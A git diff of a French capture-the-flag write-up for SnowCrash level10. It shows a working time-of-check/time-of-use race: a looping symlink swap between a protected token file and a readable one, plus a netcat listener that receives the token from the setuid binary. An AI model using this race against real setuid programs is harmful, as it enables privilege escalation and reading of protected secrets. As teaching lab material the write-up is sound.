@@ -14,17 +14,17 @@ level10@SnowCrash:~$ ./level10
 	sends file to host if you have access to it
 ```
 
-En decompilant on observe un access sur le fichier, on essaye de faire comme le level précedent :
+En decompilant on observe un `access` sur le fichier, on essaye de faire comme le level précedent :
 ```bash
 level10@SnowCrash:~$ ln -sf ~/token /tmp/link
 level10@SnowCrash:~$ ./level10 /tmp/link 0.0.0.0
 You don't have access to /tmp/link
 ```
 
-Pour passer la condition du access on peut simplement lui donner un fichier qui a les permissions:
+Pour passer la condition du `access` on peut simplement lui donner un fichier qui a les permissions:
 ```bash
-level10@SnowCrash:~$ echo hello > /tmp/test
-level10@SnowCrash:~$ nc -l 6969 & ./level10 /tmp/test 0.0.0.0
+level10@SnowCrash:~$ echo hello > /tmp/t
+level10@SnowCrash:~$ nc -l 6969 & ./level10 /tmp/t 0.0.0.0
 [2] 3767
 Connecting to 0.0.0.0:6969 .. .*( )*.
 Connected!
@@ -33,20 +33,24 @@ wrote file!
 [1]-  Done                    nc -l 696
 ```
 
-Du coup, on peut donc exploiter le temps entre la ligne access et la ligne open en changeant de link comme :
+Dans le binaire, les syscall `access` et `open` sont séparés par plusieurs lignes de code et conditions, dont la création du socket et l'envoi de la bannière au host.
+
+On peut donc exploiter le temps entre les syscall `access` et `open` en changeant de link.
+
+Comme par exemple avec cette commande :
 ```bash
 while true ; do ln -sf ~/token /tmp/link; ln -sf /tmp/t /tmp/link; done
 ```
 
-Puis on fini par boucler egalement sur le `./level10`:
+Puis on finit par boucler également sur le `./level10`, car on n'est pas assuré du résultat sur le 1er coup.
+
 ```bash
 while true; do nc -l 6969 & ./level10 /tmp/link 0.0.0.0; done
 ```
 
-On aura éventuellement le flag qui apparaîtra.
+On aura éventuellement le mot de passe de **flag10** qui apparaîtra.
 
-
-Puis on récupère le flag via l'utilisateur **flag10**.
+Puis on peut récupérer le flag.
 
 ```bash
 su -c getflag - flag10
